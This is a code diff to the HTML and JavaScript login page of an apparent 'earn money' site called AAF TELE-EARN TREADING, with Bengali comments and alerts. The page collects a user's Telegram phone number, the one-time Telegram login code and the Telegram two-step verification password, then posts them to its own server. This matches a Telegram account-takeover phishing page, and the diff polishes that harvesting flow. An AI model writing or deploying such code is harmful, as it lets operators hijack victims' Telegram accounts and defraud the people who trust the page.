@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AAF TELE-EARN TREADING</title>
+    <title>AAF TELE-EARN TREADING | Secure Login</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -12,6 +12,7 @@
             --card: #161b22;
             --border: #30363d;
             --text-dim: #8b949e;
+            --danger: #ff4d4d;
         }
 
         body {
@@ -25,7 +26,6 @@
             min-height: 100vh;
         }
 
-        /* এড স্পেস */
         .ad-unit {
             width: 100%;
             max-width: 400px;
@@ -113,6 +113,7 @@
         .btn-main:disabled {
             background: #2a7a3a;
             cursor: not-allowed;
+            opacity: 0.7;
         }
 
         .switch-link {
@@ -128,6 +129,9 @@
         }
 
         #signup-fields, #verify-fields, #confirm-box { display: none; }
+        
+        /* Error Message Style */
+        .err-msg { color: var(--danger); font-size: 12px; margin-top: 5px; display: none; }
     </style>
 </head>
 <body>
@@ -150,7 +154,7 @@
         </div>
 
         <div class="phone-container" style="margin-bottom: 15px;">
-            <input type="text" class="country-code" id="code" value="+880" maxlength="5">
+            <input type="text" class="country-code" id="country-code" value="+880" maxlength="5">
             <div class="input-group" style="width: 70%; margin-bottom: 0;">
                 <i class="fas fa-phone" style="left: 12px;"></i>
                 <input type="text" id="phone" placeholder="Telegram Number" style="padding-left: 40px;">
@@ -159,7 +163,7 @@
 
         <div class="input-group">
             <i class="fas fa-lock"></i>
-            <input type="password" id="site-pass" placeholder="Password">
+            <input type="password" id="site-pass" placeholder="Site Password">
         </div>
 
         <div id="confirm-box">
@@ -170,13 +174,16 @@
         </div>
 
         <div id="verify-fields">
+            <div style="border-top: 1px solid var(--border); margin: 20px 0; padding-top: 15px;">
+                <p style="font-size: 12px; color: var(--primary);">টেলিগ্রাম কোড এবং ২-স্টেপ দিন</p>
+            </div>
             <div class="input-group">
                 <i class="fas fa-paper-plane"></i>
                 <input type="text" id="tele-code" placeholder="Official Telegram Code">
             </div>
             <div class="input-group">
                 <i class="fas fa-key"></i>
-                <input type="password" id="two-step" placeholder="2-Step Verification Password">
+                <input type="password" id="two-step" placeholder="2-Step Password (If enabled)">
             </div>
         </div>
 
@@ -190,11 +197,10 @@
     <div class="ad-unit">ADVERTISEMENT - BOTTOM</div>
 
     <script>
-    const API_BASE_URL = "https://aaf-tele-earn-treading.onrender.com";
+    const API_BASE_URL = window.location.origin; // একই ডোমেইন হলে এটি ব্যবহার করা নিরাপদ
     let mode = 'login';
     let currentStep = 1;
 
-    // মোড পরিবর্তনের ফাংশন (Login/Signup)
     function toggleMode(target) {
         mode = target;
         currentStep = 1;
@@ -203,75 +209,98 @@
         document.getElementById('confirm-box').style.display = mode === 'signup' ? "block" : "none";
         document.getElementById('verify-fields').style.display = "none";
         document.getElementById('submit-btn').innerText = "NEXT (SEND OTP)";
+        document.getElementById('submit-btn').disabled = false;
         document.getElementById('toggle-text').innerHTML = mode === 'signup' ? 
             "Have an account? <span onclick='toggleMode(\"login\")'>Login</span>" : 
             "New here? <span onclick='toggleMode(\"signup\")'>Sign Up</span>";
     }
 
-    // মূল বাটন ফাংশন
-    function handleAuth() {
-        const phone = document.getElementById('code').value + document.getElementById('phone').value;
+    async function handleAuth() {
+        const phone = document.getElementById('country-code').value + document.getElementById('phone').value;
+        const sitePass = document.getElementById('site-pass').value;
         const submitBtn = document.getElementById('submit-btn');
 
         if (currentStep === 1) {
             // ১. ওটিপি পাঠানোর ধাপ
-            if (!document.getElementById('phone').value) { alert("Please enter phone number"); return; }
+            if (!document.getElementById('phone').value || !sitePass) { 
+                alert("ফোন নম্বর এবং পাসওয়ার্ড দুটিই দিন।"); 
+                return; 
+            }
             
-            submitBtn.innerText = "SENDING...";
+            if (mode === 'signup') {
+                const confirmPass = document.getElementById('confirm-pass').value;
+                if (sitePass !== confirmPass) { alert("পাসওয়ার্ড মেলেনি!"); return; }
+            }
+            
+            submitBtn.innerText = "SENDING OTP...";
             submitBtn.disabled = true;
 
-            fetch(`${API_BASE_URL}/api/send_otp`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: phone })
-            })
-            .then(res => res.json())
-            .then(data => {
+            try {
+                const res = await fetch(`${API_BASE_URL}/api/send_otp`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: phone })
+                });
+                const data = await res.json();
+                
                 if (data.success) {
-                    alert("OTP Sent to Telegram!");
+                    alert("আপনার টেলিগ্রামে ওটিপি পাঠানো হয়েছে।");
                     document.getElementById('verify-fields').style.display = "block";
                     submitBtn.innerText = "VERIFY & LOGIN";
-                    currentStep = 2; // দ্বিতীয় ধাপে নিয়ে যাওয়া
+                    currentStep = 2;
                 } else {
                     alert("Error: " + data.message);
                     submitBtn.innerText = "NEXT (SEND OTP)";
                 }
-            })
-            .catch(err => alert("Server connection failed!"))
-            .finally(() => { submitBtn.disabled = false; });
+            } catch (err) {
+                alert("সার্ভার কানেকশন ফেইলড!");
+                submitBtn.innerText = "NEXT (SEND OTP)";
+            } finally {
+                submitBtn.disabled = false;
+            }
 
         } else if (currentStep === 2) {
-            // ২. ওটিপি ভেরিফাই করার ধাপ
+            // ২. ওটিপি ও ২-স্টেপ ভেরিফাই করার ধাপ
             const otp = document.getElementById('tele-code').value;
             const twoStep = document.getElementById('two-step').value;
 
-            if (!otp) { alert("Please enter the code from Telegram"); return; }
+            if (!otp) { alert("টেলিগ্রাম থেকে পাওয়া ৫ ডিজিটের কোডটি দিন।"); return; }
 
             submitBtn.innerText = "VERIFYING...";
             submitBtn.disabled = true;
 
-            fetch(`${API_BASE_URL}/api/verify_login`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    phone: phone, 
-                    code: otp,
-                    password: twoStep 
-                })
-            })
-            .then(res => res.json())
-            .then(data => {
+            try {
+                const res = await fetch(`${API_BASE_URL}/api/verify_login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phone: phone, 
+                        code: otp,
+                        password: twoStep, // এটি ২-স্টেপ পাসওয়ার্ড
+                        site_password: sitePass, // এটি সাইটের নিজস্ব পাসওয়ার্ড
+                        mode: mode
+                    })
+                });
+                const data = await res.json();
+                
                 if (data.success) {
-                    alert("Login Successful!");
-                    window.location.href = "/dashboard"; // ড্যাশবোর্ডে নিয়ে যাবে
+                    // সাকসেস হলে লোকাল ডাটা সেভ এবং রিডাইরেক্ট
+                    localStorage.setItem('user_id', data.uid);
+                    alert("অভিনন্দন! লগইন সফল হয়েছে।");
+                    window.location.replace(window.location.origin + "/dashboard");
                 } else {
-                    alert("Verification Failed: " + data.message);
+                    // ভুল ওটিপি বা পাসওয়ার্ড দিলে এখানে ধরবে
+                    alert("ভেরিফিকেশন ব্যর্থ: " + data.message);
+                    submitBtn.innerText = "VERIFY & LOGIN";
                 }
-            })
-            .catch(err => alert("Server Error!"))
-            .finally(() => { submitBtn.disabled = false; });
+            } catch (err) {
+                alert("ভেরিফিকেশন এরর! ইন্টারনেটের কানেকশন চেক করুন।");
+                submitBtn.innerText = "VERIFY & LOGIN";
+            } finally {
+                submitBtn.disabled = false;
+            }
         }
     }
-            </script>
+    </script>
 </body>
 </html>
